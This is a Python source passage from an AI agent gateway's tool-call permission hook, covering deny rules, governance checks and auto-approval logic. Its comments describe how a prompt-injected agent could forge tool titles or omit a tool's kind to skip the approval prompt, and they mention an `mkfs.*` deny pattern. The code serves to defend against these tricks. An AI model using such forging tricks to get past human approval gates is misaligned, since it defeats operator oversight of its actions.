        # forbids. No spelling of that title fixes it -- the ambiguity is in the
        # format -- so the trusted fields are composed straight into the canonical
        # ``@server/tool`` form the matcher documents, where ``/`` separates and
        # neither segment can contain it. A server with no proven tool asks the
        # server-level question ``@server``, which a ``@server`` rule matches and
        # a ``@server/tool`` rule correctly does not.
        #
        # Deliberately NOT added to ``deny_targets``: that plane matches raw text
        # and operator regexes, where a canonical reference is a DIFFERENT string
        # from the raw identity a rule is written against rather than a broader
        # form of it, and feeding it there would widen matching by accident
        # instead of by grammar.
        governance_mcp_ref = mcp_identity_ref(mcp_server_name, mcp_tool_name)
        if command:
            deny_targets.append(command)
        for target in deny_targets:
            reason = authority.is_denied(
                target,
                self._config.auto_deny_tools,
                denied_regexes=denied_regexes,
                reason_notes=denied_notes,
            )
            if reason:
                return ToolHookResult.deny(reason)

        # A file-search builtin's scope lives only in its arguments -- it carries no
        # ``command``, and its title need not name the root it walks -- so this target is
        # the only form in which a deny rule can see a whole-tree walk.
        #
        # It is evaluated in its OWN tier, not appended to the loop above, because it is
        # not a command line: run through the shared rule set it collides with the
        # command-oriented built-ins on argument text (the ``mkfs.*`` rule denying a
        # read-only search of a directory named ``mkfs-tests``), and the only per-rule
        # remedy -- disabling that rule by id -- also stops it protecting real shell
        # commands.
        #
        # The patterns that PARTICIPATE are passed explicitly: the operator's own enabled
        # regexes, never the merged effective set.  That is what makes provenance
        # structural rather than inferred -- classifying the merged set by pattern TEXT
        # cannot tell an operator's rule from a shipped one when the text coincides
        # (``mkfs.*`` is a natural thing to type), and reading the operator's own rule as
        # shipped would silently drop an explicit deny.  The shipped catalogue takes no
        # part here at all: none of its rules is authored against the synthesized grammar
        # (ratcheted in the tests), so a built-in's only possible hit is the incidental
        # one this tier exists to drop.
        search_target = _search_deny_target(raw_params)
        if search_target:
            reason = authority.is_denied_synthesized_target(
                search_target,
                [p.pattern for p in self._config.denied_commands_user_added if p.enabled],
                extra_patterns=self._config.auto_deny_tools,
                reason_notes=denied_notes,
            )
            if reason:
                return ToolHookResult.deny(reason)

        # Governance ceiling ∩ active profile (Level 1 ∩ Level 2).  Runs BEFORE
        # the auto-approve loop so a governance deny wins over a user
        # auto-approve and is never bypassed.  This is the layer that denies a
        # tool/MCP call even when the kiro agent config granted it, by name,
        # regardless of kiro's allowedTools.  No-op on a standalone host with no
        # policy and no bound profile (gate_decision permits), so today's
        # behavior is preserved unless governance is configured.
        #
        # Governed under BOTH identities for the reason spelled out at
        # ``canonical_mcp_name``: a ceiling/profile rule naming the real MCP tool
        # must bind even when the title is model-authored prose, and a rule
        # naming the title must still bind. Tightest-wins, so evaluating both and
        # denying on either preserves the governance contract. The MCP identity
        # is ``governance_mcp_name``, which falls back to the server alone when
        # that is all the backend proved.
        # Governance is asked about the display title AND, separately, the trusted
        # MCP identity. The identity travels as a canonical reference rather than a
        # title because the title grammar cannot round-trip every name (see
        # ``mcp_identity_ref``); a deny on either is final. An absent identity
        # (a non-MCP call) is not asked about at all -- an empty title classifies
        # to the unprefixed scopes, where it is a queryable item rather than a
        # no-op, so querying it could deny on a rule it has nothing to do with.
        # ONE query, every identity. The title, the trusted tool name and the MCP
        # reference are all asked against a SINGLE resolved profile: asking them
        # as separate calls re-resolved the active profile each time, so a profile
        # hot-reloaded mid-call could answer each question from a different
        # snapshot and permit a tool that both complete profiles deny -- and each
        # extra call walked ``profiles/`` synchronously on the event loop.
        # Tightest-wins is preserved: a deny on any identity denies the call.
        gov_reason = _governance_denial(
            ctx,
            tool_name,
            session_key,
            agent,
            app,
            tool_kind,
            raw_params,
            mcp_ref=governance_mcp_ref,
            extra_titles=(mcp_tool_name,) if mcp_tool_name and mcp_tool_name != tool_name else (),
        )
        if gov_reason:
            return ToolHookResult.deny_policy(gov_reason)

        # App-own MCP server auto-approve — a FIRST-PARTY (builtin) app agent
        # calling its OWN app-scoped MCP server is intra-app, not a host surface.
        # A builtin app's declared server is registered under the
        # ``<app>:<server>`` key (see ``apps/bridges.py``) and IS the gateway's
        # own shipped code, so it only touches the app's own data — never
        # fs/network/exec/exfil on the host. Once a shipped app agent stopped
        # pre-authorizing tools (no template ``allowedTools``, the "no template
        # pre-authorizes tools" invariant), even those intra-app calls fell
        # through to an interactive prompt the user could not meaningfully act on
        # (the app was blocked from talking to itself). Auto-approving them here
        # restores that UX without re-widening any host grant.
        #
        # Keyed on the NON-model-authored ``mcp_server_name`` (the ACP
        # ``_meta.kiro.mcpServerName``), NEVER on the LLM-authored title: a
        # prompt-injected agent can title a Bash call ``mcp__<app>:srv__x``, but
        # kiro-cli only sets ``mcp_server_name`` for a genuine MCP-served call, so
        # a forged shell/host title carries an empty server name and never
        # matches (fail-closed). Restricted to builtins on purpose: only a
        # builtin's server is provably first-party. A THIRD-PARTY app's server is
        # arbitrary installed code whose internals the gate cannot see, so its
        # own-server calls are NOT auto-approved here — the OS sandbox it runs
        # under and the third-party admission gate bound its behavior instead.
        #
        # Placed AFTER the always-on deny floor and ``_governance_denial`` so a
        # ceiling/profile can still deny even a builtin's own server and every
        # sensitive-path / keystone / exfil deny above still wins; and BEFORE the
        # interactive fall-through, independent of the Normal/Read/Trust tier
        # (that tier governs the HOST tools an app agent may reach, not the app
        # talking to its own server). Generic App Kit contract keyed only on the
        # ``<app>:<server>`` convention + shipped-manifest provenance — no per-app
        # special-casing.
        #
        # ``_app_owns_mcp_server`` only proves the NAME is ``<app>:``-prefixed;
        # ``_own_mcp_servers`` (bridges.py) injects app servers into the agent by
        # reading that prefix from the MUTABLE global MCP config, so a
        # ``<app>:evil`` entry that landed there (not declared by the app) would
        # otherwise be trusted. Require the server to be DECLARED in the app's
        # SHIPPED manifest (``_is_declared_builtin_mcp_server``, an in-memory set
        # warmed at boot from immutable manifests — same discipline as
        # ``_BUILTIN_APP_NAMES``) so only a genuinely app-own server auto-approves.
        #
        # Recover an app identity for a builtin whose slot carries NONE. Only a
        # request with an authenticated app scope sets ``Slot._app``, so a
        # builtin whose UI is not an app iframe (an Electron window using the
        # dashboard session cookie) binds its slot with an empty app and every
        # condition below keyed on it fails — the app could not talk to its own
        # server. Prefer the slot's own ``app`` whenever it HAS one, so an
        # app-scoped session behaves exactly as before; the derived value is used
        # ONLY for this auto-approve and is never written back to the slot (see
        # ``_builtin_app_for_agent`` — ``_app`` also drives app isolation).
        #
        # Keyed on ``resolved_agent`` (what ACTUALLY ran), NEVER on ``agent``:
        # the latter is the slot's ALIAS, which ``resolve_agent_bindings`` maps to
        # a concrete kiro agent before dispatch, so a user-defined alias named
        # after a builtin's agent could otherwise borrow that app's identity for
        # a completely different runtime agent. An empty ``resolved_agent`` (an
        # uncached permission event, or a caller that does not thread it through)
        # yields no identity — fail-closed to interactive approval.
        owner_app = app or _builtin_app_for_agent(resolved_agent)
        if (
            _app_owns_mcp_server(mcp_server_name, owner_app)
            and _is_first_party_app(owner_app)
            and _is_declared_builtin_mcp_server(mcp_server_name)
        ):
            # The deny floor has already run against ``canonical_mcp_name`` and
            # governance against ``governance_mcp_name`` on the common path above,
            # so a ceiling or profile denying ONE tool of this server — or the
            # server as a whole — has returned a deny and cannot reach this
            # auto-approve. Those checks live there only, so there is one copy to
            # keep in step rather than two.
            #
            # The identity requirement is what this branch enforces: a missing
            # trusted tool name (a backend without ``_meta.kiro.toolName``, or an
            # uncached permission event) leaves ``canonical_mcp_name`` empty,
            # which means WHICH tool this is cannot be proven — and an
            # unidentifiable tool must not be auto-approved on the strength of its
            # server alone. Fall through to interactive approval (fail-closed),
            # never silent execute.
            if canonical_mcp_name:
                return ToolHookResult.auto_approve()

        # Auto-approve — match against both the original title (preserves
        # "Running: "/"Reading " prefixes) and the normalized name (stripped)
        # so that "Running: *" and bare tool-name patterns both work.
        #
        # This loop matches only the TITLE, which the agent authors — safe here
        # ONLY because a shell call whose command could not be recovered was
        # already hard-denied above, so no unverified command can reach it. Do not
        # weaken that refusal without also gating this loop.
        for pattern in self._config.auto_approve_tools:
            if _tool_matches(pattern, tool_name) or _tool_matches(pattern, normalized):
                return ToolHookResult.auto_approve()

        # KiroCrew-side read-only auto-approve — the LAST branch before allow(),
        # AFTER every early-return deny (deny-by-default shell, sensitive-path,
        # sensitive-bash, exfil, write-protected-config, the effective deny set,
        # and governance). Its position guarantees a read-only classification can
        # never re-admit anything the gates above blocked. This re-homes the
        # "reads don't nag" UX now that kiro-cli's autoAllowReadonly is retired.
        # Imports are function-local: slack.gateway imports hooks at module top,
        # so a top-level import here would create a boot import cycle.
        if is_shell:
            # A shell read-only classification uses the deny-by-default bash
            # classifier (rejects redirects/substitution/backgrounding). When the
            # command could not be recovered we already denied above; a present
            # command that is not read-only falls through to interactive approval.
            from kiro_crew.dashboard.state import is_read_only_bash

            if command and is_read_only_bash(command):
                return ToolHookResult.auto_approve()
        else:
            from kiro_crew.slack.gateway import _is_read_only_tool

            kind = (tool_kind or "").strip().lower()
            # Trust the SEMANTIC kind, as an ALLOW-list. `tool_kind` is passed
            # through verbatim from the ACP `kind` field (``acp/_dispatch.py``), so it
            # is an arbitrary agent-influenced string and a DENYLIST of mutating kinds
            # can never be complete — `kind="other"` is a real ACP value. Only these
            # two spellings mean "this cannot change anything".
            if kind in _READ_ONLY_TOOL_KINDS:
                return ToolHookResult.auto_approve()
            # Computer-use observation tools ("reads don't nag" for this feature too),
            # and they require an EXPLICIT read-only kind — reached only under the
            # branch above. Two agent-controlled inputs meet here and neither may
            # decide alone:
            #
            #   * `tool_name` comes from `select_tool_title`, which prefers the
            #     LLM-authored `description`, so a mutating call can title itself
            #     `…__computer_get_state`;
            #   * an omitted `kind` is indistinguishable from an honest one.
            #
            # Keying the class lookup on the title alone therefore let a `computer_click`
            # forge an observation title, omit its kind, and skip the approval prompt
            # entirely once the operator enabled computer use — the prompt that is the
            # last thing between an injected agent and a real click on the operator's
            # desktop. Demanding the kind means the two inputs must AGREE.
            #
            # The class table is still consulted (never `_is_read_only_tool`, whose
            # leading-verb heuristic would auto-approve every `computer_*` tool or none
            # depending on the name), and it is still gated on the keystone primary
            # enable so no auto-approval can exist while the feature is off. Reached
            # only AFTER the deny floor and `_governance_denial`, so a governance deny
            # still wins. There is deliberately no approval-floor clamp to mention: the
            # `computer_use.approval` ordinal was removed with the rest of that model.
            if kind in _READ_ONLY_TOOL_KINDS and _cu_read_only_auto_approve(tool_name):
                return ToolHookResult.auto_approve()
            # Any other non-empty kind falls through to interactive approval, whatever
            # the call titles itself. Over-blocking costs one prompt; under-blocking
            # costs the prompt.
            if kind:
                return ToolHookResult.allow()
            # Kind ABSENT: the pre-existing generic fallback, unchanged. It is safe for
            # computer use specifically because `_is_read_only_tool` matches on a
            # leading read-ish verb and rejects EVERY `mcp__kirocrew-computer__*` title
            # (verified) — so a forged computer-use title cannot reach an auto-approve
            # through this path either.
            if _is_read_only_tool(tool_name):
                return ToolHookResult.auto_approve()

        return ToolHookResult.allow()

    def _effective_denied(self, ctx: object) -> list[str]:
        """Resolve the effective regex-tier denied set for this call.

        Combines the still-enabled built-in rules (after applying
        ``disable_all`` / ``disabled_ids``, with governance-pinned rule ids
        force-re-added) with the user's own enabled ``user_added`` regexes. The
        result is passed to ``authority.is_denied(..., denied_regexes=)``; the
        glob-tier ``auto_deny_tools`` still travel through ``extra_patterns``.
        """
        return resolve_effective_denied_regexes(self._config, ctx)

    def _denied_notes(self) -> dict[str, str]:
        """Operator notes for the user patterns in the effective denied set.

        Passed alongside ``denied_regexes`` so a refusal can carry the operator's
        own remediation line. Empty dict when nothing is annotated, which is the
        pre-existing behavior (reason = the bare pattern).
        """
        return resolve_denied_notes(self._config)

    def effective_denied_regexes(self, *, include_governance_pins: bool = True) -> list[str]:
        """Public accessor for the effective regex-tier denied set.

        Resolves the platform context itself, so callers outside the tool-call
        gate (e.g. ``llm_helpers._resolve_permission`` on the cron / Slack /
        workflow / heartbeat surfaces) can honor the SAME user opt-out +
        governance-pin state that ``on_tool_call`` enforces, instead of failing
        closed to all built-ins and re-introducing "disabled but still blocked".

        Pass ``include_governance_pins=False`` only to CLASSIFY a deny that has
        already been decided by the pinned set — never to decide one. See
        ``resolve_effective_denied_regexes``.
        """
        return resolve_effective_denied_regexes(
            self._config, current_context(), include_governance_pins=include_governance_pins
        )


# ACP semantic tool kinds treated as read-only for the non-shell auto-approve
# branch. Deliberately minimal — excludes "search"/"edit"/"execute"/"delete"/
# "move"; add conservatively (auto-approving trusts an agent-supplied field).
_READ_ONLY_TOOL_KINDS: frozenset[str] = frozenset({"read", "fetch"})

# Semantic kinds known to mutate/execute. DOCUMENTATION ONLY — the gate no longer
# branches on this set, and must not start again: `tool_kind` arrives verbatim from
# the ACP `kind` field, so any denylist of mutating kinds is incomplete by
# construction (`kind="other"` is a real value that a denylist auto-approved). The
# auto-approve decision is an ALLOW-list on `_READ_ONLY_TOOL_KINDS` instead, and
# every other non-empty kind falls through to interactive approval.
#
# Kept because it records which kinds we have actually seen mutate — useful when
# judging whether a new kind belongs in the read-only set — and because deleting a
# named constant is how the next reader loses that context.
_WRITE_TOOL_KINDS: frozenset[str] = frozenset(
    {"edit", "execute", "delete", "move", "write", "create"}
)


def _governance_pinned_command_ids(ctx: object) -> set[str]:
    """Return built-in command rule ids force-pinned by the active governance ceiling.

    Reads the boot-frozen ceiling (``ctx.governance``) ``commands``-scope deny
    patterns and maps the ones that pin a built-in rule to that rule's id, so
    ``_effective_denied`` can force-re-enable them even when the user opted out
    (tightest-wins). Returns ``set()`` on a standalone/ungoverned host.

    Fail-soft, mirroring ``_governance_denial``: a ``PlatformCompositionError``
    (a non-standalone host that could not compose) propagates fail-closed; any
    other error degrades to an empty set so a transient governance glitch cannot
    wedge every tool call out of ``_effective_denied``. The enterprise force-pin
    is also independently enforced by ``_governance_denial``'s commands-scope
    deny plane, so pins here are belt-and-suspenders.
    """
    from kiro_crew.platform.context import PlatformCompositionError

    try:
        return security.pinned_builtin_command_ids()
    except PlatformCompositionError:
        raise
    except Exception:
        logger.debug("governance pin resolution failed", exc_info=True)
        return set()


def load_denied_commands_state() -> dict:
    """Read the keystone ``denied_commands.json`` opt-out state (fail-soft to {}).

    The opt-out state (``{disable_all, disabled_ids, user_added}``) lives in a
    keystone trust-root file the agent cannot write, NOT in ``config.json``.
    Returns ``{}`` (= no opt-out, all built-ins enforced) if the file is absent,
    unreadable, or not a JSON object — fail-safe for a deny gate.
    """
    try:
        from kiro_crew.config.loader import denied_commands_path

        raw = json.loads(denied_commands_path().read_text(encoding="utf-8"))
        return raw if isinstance(raw, dict) else {}
    except FileNotFoundError:
        return {}
    except Exception:
        logger.debug("denied_commands.json load failed; treating as no opt-out", exc_info=True)
        return {}


def hooks_config_from_config_dict(hooks_section: dict) -> HooksConfig:
    """Build a ``HooksConfig`` for the gateway boot path.

    Parses the config.json ``hooks`` section for the flat hook keys, then
    OVERLAYS the denied-command opt-out state from the keystone
    ``denied_commands.json`` file (config.json's ``hooks.denied_commands`` is
    ignored — the keystone file is the sole source, so an agent that edits
    config.json cannot affect the deny ceiling).
    """
    merged = dict(hooks_section) if isinstance(hooks_section, dict) else {}
    merged["denied_commands"] = load_denied_commands_state()
    return HooksConfig.from_dict(merged)


def resolve_effective_denied_regexes(
    config: "HooksConfig", ctx: object = None, *, include_governance_pins: bool = True
) -> list[str]:
    """Effective regex-tier denied set from a HooksConfig (module-level).

    Same resolution as ``HookManager._effective_denied`` but usable by callers
    that hold a config rather than a HookManager (e.g. cron command vetting in
    ``mcp_cron``). Honors the user opt-out (disable_all / disabled_ids /
    user_added) with governance pins force-re-added (tightest-wins).

    ``include_governance_pins=False`` resolves the set the USER's own opt-out
    state would produce on its own. Enforcement must never use it — dropping
    pins is exactly the opt-out a pin exists to refuse. It answers a different
    question: comparing a deny against both sets tells a caller whether the
    match came ONLY from a pin, i.e. whether the block is policy state (which a
    later loosening reverses) or a rule the user is enforcing themselves.
    """
    return security.compute_effective_denied(
        list(security.BUILTIN_DENIED_RULES) + security.edition_denied_rules(),
        config.denied_commands_disabled_ids,
        config.denied_commands_disable_all,
        [p.pattern for p in config.denied_commands_user_added if p.enabled],
        _governance_pinned_command_ids(ctx) if include_governance_pins else (),
    )


def resolve_denied_notes(config: "HooksConfig") -> dict[str, str]:
    """Map each annotated, enabled user pattern to its operator note.

    The note is what the refusal shows INSTEAD of leaving the agent to infer
    intent from a raw regex — e.g. "use --maxdepth, or rg/fd" rather than a
    40-character character-class soup. Keyed by pattern because that is the only
    identity the matcher carries into ``security.is_denied``; ids are not
    threaded through the regex tier.

    Only enabled rules with a non-blank note appear. Built-in rules are absent
    on purpose: their ``description`` is catalog documentation aimed at the
    Settings reader, not remediation aimed at the caller, so promoting it into
    every refusal would change the text of rules the operator never annotated.

    A note containing :data:`security.DENY_REASON_MATCH_PREFIX` is DROPPED. The
    note is emitted on its own line, and ``RecoveryCard.tsx`` parses refusals with
    a GLOBAL per-line regex, so such a note would be read as a second, fabricated
    deny pattern. The guard uses the COLON-terminated form, not the emitted prefix:
    the regex treats the space after the colon as optional, so
    ``"Blocked by security policy:forged"`` parses as a refusal line without
    containing the emitted prefix. The add endpoint rejects this at write time;
    this guard is the one that holds for a keystone file the operator edited by
    hand. Fail-safe direction: lose the note, keep the pattern.
    """
    return {
        p.pattern: p.note.strip()
        for p in config.denied_commands_user_added
        if p.enabled
        and p.pattern
        and p.note.strip()
        and security.DENY_REASON_MATCH_PREFIX not in p.note
    }


def effective_denied_regexes_from_config() -> list[str]:
    """Resolve the effective denied set from on-disk state.

    Convenience for surfaces with neither a HookManager nor a parsed config in
    hand (cron vetting). The denied-command opt-out state comes from the keystone
    ``denied_commands.json`` (NOT config.json). Fail-soft: on any load error,
    falls back to the full built-in set (fail-closed — safer for a deny gate) so
    a glitch can never silently drop enforcement.
    """
    try:
        cfg = HooksConfig.from_dict({"denied_commands": load_denied_commands_state()})
        return resolve_effective_denied_regexes(cfg)
    except Exception:
        logger.debug("effective denied-set load failed; failing closed", exc_info=True)
        return security.compute_effective_denied(security.BUILTIN_DENIED_RULES, (), False, (), ())


def _governance_denial(
    ctx: object,
    tool_name: str,
    session_key: str,
    agent: str,
    app: str,
    tool_kind: str = "",
    raw_params: dict | None = None,
    mcp_ref: str = "",
    extra_titles: tuple[str, ...] = (),
) -> str | None:
    """Return a denial reason if governance forbids *tool_name*, else None.

    *mcp_ref* is an already-canonical ``@server`` / ``@server/tool`` reference
    for the trusted MCP identity, evaluated in addition to (or instead of) the
    display title. It is passed as a reference rather than folded into
    *tool_name* because the title grammar cannot encode every identity; both are
    empty for a non-MCP call with no title, which governs nothing.

    Resolves the active profile (Level 2) for the calling surface and intersects
    it with the boot-frozen ceiling (Level 1).  Fast no-op when the host has
    neither a policy ceiling nor any profiles, so an ungoverned standalone host
    pays only an attribute read.  Emits a governance audit record on a deny.

    Fail-closed discipline mirrors the CPP shims: a ``PlatformCompositionError``
    (a non-standalone host that could not compose) is re-raised, never swallowed;
    any other unexpected error degrades to "no governance opinion" (None) so a
    transient profile-load glitch cannot wedge every tool call — the always-on
    deny floor above already ran.
    """
    from kiro_crew.platform.context import PlatformCompositionError

    ceiling = getattr(ctx, "governance", None)
    try:
        from kiro_crew.platform.governance import gate_decision
        from kiro_crew.platform.governance_profiles import resolve_active_scope

        profile = resolve_active_scope(session_key, agent=agent, app=app)
        # Nothing to enforce: no ceiling and no bound/forced profile.
        if ceiling is None and profile is None:
            return None
        decision = gate_decision(
            ceiling,
            profile,
            tool_name,
            tool_kind=tool_kind,
            raw_params=raw_params,
            mcp_ref=mcp_ref,
            extra_titles=extra_titles,
        )
        if not decision.permitted:
            # The denied identity when the decision names one -- with the title,
            # the trusted tool name and the MCP reference all in one query, the
            # subject is whichever of them the rule matched, not always the title.
            subject = getattr(decision, "item", "") or tool_name or mcp_ref
            _audit_governance(session_key, agent, subject, decision)
            return f"Blocked by governance policy: {decision.reason}"
        return None
    except PlatformCompositionError:
        raise
    except Exception:
        # Wrap the late import + audit so a broken/renamed/partially-installed
        # governance_profiles cannot raise ImportError out of this except-branch
        # and convert the intended soft fail-open into a hard fail-closed that
        # wedges every tool call.
        try:
            from kiro_crew.platform.governance_profiles import audit_governance_degraded

            audit_governance_degraded("hooks.on_tool_call", session_key=session_key, app=app)
        except Exception:
            logger.debug("governance degrade audit unavailable", exc_info=True)
        return None


def _app_owns_mcp_server(mcp_server_name: str, app: str) -> bool:
    """True when *mcp_server_name* is *app*'s OWN app-scoped MCP server.

    App-declared MCP servers are registered under the ``<app>:<server>`` key
    (``apps/bridges.py`` ``_own_mcp_servers``), so the owning app is the segment
    before the first ``:``.  ``mcp_server_name`` is the trusted, NON-model-authored
    identity from ``_meta.kiro.mcpServerName`` (``AcpEvent.mcp_server_name``) —
    NOT the LLM-authored display title — so a forged shell/host title cannot spoof
    a match: kiro-cli leaves ``mcp_server_name`` empty for non-MCP tools, and an
    empty value fails closed here.  Comparison is case-insensitive to mirror the
    governance MCP matcher.  Returns ``False`` for a blank ``app`` (an ordinary
    user/host turn carries no app identity) and for any server name that is not
    ``<app>:``-prefixed (host/managed servers such as ``kirocrew-cron`` never
    match).
    """
    if not app or not mcp_server_name:
        return False
    owning_app, sep, _rest = mcp_server_name.partition(":")
    return bool(sep) and owning_app.casefold() == app.casefold()


# Canonical ``<app>:<server>`` names DECLARED in shipped builtin manifests,
# populated ONCE at gateway boot via ``set_builtin_app_mcp_servers`` (see the
# dashboard startup). Parallel to ``_BUILTIN_APP_NAMES`` and kept as a plain
# module global for the same reason — the PreToolUse gate does ZERO filesystem
# I/O; the shipped-manifest scan happens once at boot, off the event loop. Names
# are casefolded on ingest so the gate lookup is a pure set membership test.
# Empty until warmed → fail-closed: an unrecognised server name never
# auto-approves. This is what stops an undeclared ``<app>:evil`` entry that
# landed in the MUTABLE global MCP config from being trusted just because its
# prefix matches a first-party app.
_BUILTIN_APP_MCP_SERVERS: frozenset[str] = frozenset()


def set_builtin_app_mcp_servers(names: Iterable[str]) -> None:
    """Install the set of shipped-manifest-declared ``<app>:<server>`` names.

    Called once at gateway boot with the names from
    ``apps.execution.builtin_app_mcp_servers`` (which enumerates the same
    immutable manifest sources as ``builtin_app_names``). Dependency-inverted
    like ``set_builtin_app_names`` so ``hooks`` never imports ``apps`` and the
    gate never touches the filesystem. Idempotent; a later call replaces the set.
    """
    global _BUILTIN_APP_MCP_SERVERS
    _BUILTIN_APP_MCP_SERVERS = frozenset(n.casefold() for n in names if isinstance(n, str) and n)


def _is_declared_builtin_mcp_server(mcp_server_name: str) -> bool:
    """True when *mcp_server_name* is a server a shipped builtin manifest declares.

    Pure in-memory, case-insensitive membership test against
    ``_BUILTIN_APP_MCP_SERVERS`` (warmed at boot from immutable manifests). The
    app-own-server auto-approve requires this in addition to prefix ownership so
    a ``<app>:``-prefixed entry the app never declared (e.g. one injected into
    the mutable global MCP config) cannot win an auto-approval. Fail-closed
    before the set is warmed.
    """
    return bool(mcp_server_name) and mcp_server_name.casefold() in _BUILTIN_APP_MCP_SERVERS


# Builtin (first-party) app names, populated ONCE at gateway boot via
# ``set_builtin_app_names`` (see the dashboard startup). Kept as a plain
# module global — NOT derived on the per-tool-call path — so the PreToolUse gate
# does ZERO filesystem I/O: scanning the shipped-manifest tree on the event loop
# (even once, before an lru_cache warmed) would stall every gateway task. Names
# are casefolded on ingest so the gate lookup is a pure set membership test.
# Empty until warmed → fail-closed: an app whose provenance is not yet known is
# treated as third-party and its own-server calls simply prompt (never wrongly
# auto-approved). Boot runs on the startup thread, well before any tool call.
_BUILTIN_APP_NAMES: frozenset[str] = frozenset()


def set_builtin_app_names(names: Iterable[str]) -> None:
    """Install the set of first-party (builtin) app names for the gate.

    Called once at gateway boot with the names discovered from the shipped
    manifests (``apps.execution.builtin_app_names``, which enumerates the same
    sources as ``shipped_builtin_app_root`` — core + the active edition). The
    dependency is
    inverted on purpose — boot code (which already imports ``apps``) pushes the
    names in, so ``hooks`` never imports ``apps`` and the gate never touches the
    filesystem. Idempotent; a later call replaces the set.
    """
    global _BUILTIN_APP_NAMES
    _BUILTIN_APP_NAMES = frozenset(n.casefold() for n in names if isinstance(n, str) and n)


def _is_first_party_app(app: str) -> bool:
    """True when *app* is a shipped builtin (first-party gateway code).

    Only a BUILTIN app's MCP server is provably the gateway's own shipped code,
    so only then does the app-own-server auto-approve's justification — "the
    server is the app's own declared code and only touches the app's own data,
    never a host surface" — actually hold.  A THIRD-PARTY installed app's server
    is arbitrary operator-installed code whose internals the PreToolUse gate
    cannot see (it reads files with plain OS syscalls in its own process, which
    the gate never observes), so its own-server calls are NOT blanket
    auto-approved here — they still surface for interactive approval / governance.
    What bounds a server's internal behavior is the OS sandbox it runs under plus
    the third-party install/admission gate, not this UX auto-approve.

    Pure in-memory lookup against ``_BUILTIN_APP_NAMES`` (populated at boot from
    immutable shipped-manifest provenance) — NO filesystem I/O on the event loop.
    Fail-closed before the set is warmed.
    """
    return bool(app) and app.casefold() in _BUILTIN_APP_NAMES


# Agent name → owning builtin app, populated ONCE at gateway boot via
# ``set_builtin_app_agents``. Parallel to ``_BUILTIN_APP_NAMES`` /
# ``_BUILTIN_APP_MCP_SERVERS`` and kept as a plain module global for the same
# reason — the PreToolUse gate does ZERO filesystem I/O. Keys are casefolded on
# ingest so the lookup is a pure dict hit. Empty until warmed → fail-closed: an
# unrecognised agent yields no app identity and its own-server calls simply
# prompt, exactly as before this map existed.
_BUILTIN_APP_AGENTS: dict[str, str] = {}


def set_builtin_app_agents(mapping: "Mapping[str, str]") -> None:
    """Install the agent → owning-builtin-app map for the gate.

    Called once at gateway boot with ``apps.execution.builtin_app_agents()`` —
    derived only from shipped manifests whose install is builtin-owned, with
    ambiguous names already dropped. Dependency-inverted like
    ``set_builtin_app_names`` so ``hooks`` never imports ``apps``. Idempotent; a
    later call replaces the map.
    """
    global _BUILTIN_APP_AGENTS
    _BUILTIN_APP_AGENTS = {
        agent.casefold(): app
        for agent, app in mapping.items()
        if isinstance(agent, str) and agent and isinstance(app, str) and app
    }


def _builtin_app_for_agent(resolved_agent: str) -> str:
    """The builtin app that SHIPS *resolved_agent*, or ``""`` when none provably does.

    Recovers an app identity for a slot whose ``_app`` is empty. ``Slot._app``
    comes from the request's AUTHENTICATED app scope, so a builtin app whose UI
    is not an app iframe — e.g. an Electron window that authenticates with the
    dashboard session cookie — binds its slot with NO app identity, and its
    calls to its OWN MCP server never satisfy the app-own-server auto-approve
    below (``_app_owns_mcp_server`` returns False for a blank app).

    The argument MUST be the RESOLVED agent (what actually served the turn, i.e.
    ``AcpClient._agent`` / ``read_effective_agent``), never ``Slot.agent``. The
    slot's agent is an ALIAS that ``resolve_agent_bindings`` maps to a concrete
    kiro agent before dispatch — a slot set to ``default`` can be served by
    ``kirocrew`` — so an alias NAMED after a builtin's agent would otherwise lend
    that app's identity to a different runtime agent entirely. Keying on the
    resolved id makes the grant follow what ran, matching the precedence
    ``read_effective_agent`` already establishes for usage attribution. The map
    itself is built solely from IMMUTABLE shipped manifests, so nothing the
    client sent decides which app an agent belongs to.

    Used ONLY to satisfy the app-own-server auto-approve. Deliberately NOT
    written back to ``Slot._app``: that field also drives app ISOLATION (which
    app may delete or retitle a slot), so marking a dashboard-created slot
    app-owned would widen those checks. Pure in-memory lookup; fail-closed before
    the map is warmed and for an empty resolved agent.
    """
    return _BUILTIN_APP_AGENTS.get(resolved_agent.casefold(), "") if resolved_agent else ""


def _cu_read_only_auto_approve(tool_name: str) -> bool:
    """True when *tool_name* is a computer-use OBSERVATION tool and the feature is on.

    Two independent conditions, both required:

    * the action is classified ``observe`` by the code-owned table in
      ``platform/governance.py`` (never by a title heuristic, and never by a
      private copy of the table — the class table is the single source of truth);
    * the keystone primary enable says the feature is on, so a disabled feature's
      tools are not silently pre-approved.

    Fail-CLOSED (False on any error): failing to auto-approve merely falls through
    to interactive approval, which is the safe direction.
    """
    action = computer_use_action_from_title(tool_name)
    if not action:
        return False
    if CU_CLASS_OBSERVE not in computer_use_action_classes(action):
        return False
    try:
        # Deferred deliberately: ``enable_state`` imports ``config.loader``, which
        # hooks.py keeps OFF its module import path (the loader fires the data-home
        # migration and pulls the whole config stack). Reached only after the
        # cheap prefix + class tests above, so an ungoverned host with no
        # computer-use traffic never pays for it.
        from kiro_crew.computer_use import enable_state

        return enable_state.is_enabled()
    except Exception:
        logger.debug("computer-use enable-state probe failed", exc_info=True)
        return False


def _audit_governance(session_key: str, agent: str, tool_name: str, decision: object) -> None:
    """Best-effort SEL audit of a governance denial (records scope/rule/layer)."""
    try:
        from kiro_crew.sel import sel

        sel().log_governance_decision(
            session_key=session_key,
            agent=agent or "kirocrew",
            tool_name=tool_name,
            outcome="denied",
            rule=getattr(decision, "rule", ""),
            layer=getattr(decision, "layer", ""),
            reason=getattr(decision, "reason", ""),
        )
    except Exception:
        logger.debug("governance audit emit failed", exc_info=True)


# Display prefixes that kiro-cli ACP adds to tool titles
_TOOL_TITLE_PREFIXES = ("Running: ", "Reading ")

# ACP semantic tool kind for a file write/edit (fs_write / code). The kind that
# carries a real target path in ``raw_params['path']`` and maps to the
# ``filesystem.write`` scope. Used to gate the write-only config-file protection
# so reads are not affected.
_EDIT_TOOL_KIND = "edit"

# Fixed prefix of the synthesized file-search deny target. A NAMESPACE, not a trust
# boundary: it exists so a rule can address a search's SCOPE distinctly from a command
# line. The display title is a deny target in its own right, so a title quoting this
# prefix trips such a rule too — an over-block, identical to the title tier for every
# other rule, and it grants nothing.
_SEARCH_DENY_PREFIX = "file-search"

# ``operation`` values that walk a tree WITHOUT carrying a ``pattern``. Enumerated by
# name, so a tool with a novel recursive argument shape is not recognized — see the
# residual limits in ``_search_deny_target``.
_RECURSIVE_SEARCH_OPERATIONS: frozenset[str] = frozenset(
    {
        "search_symbols",
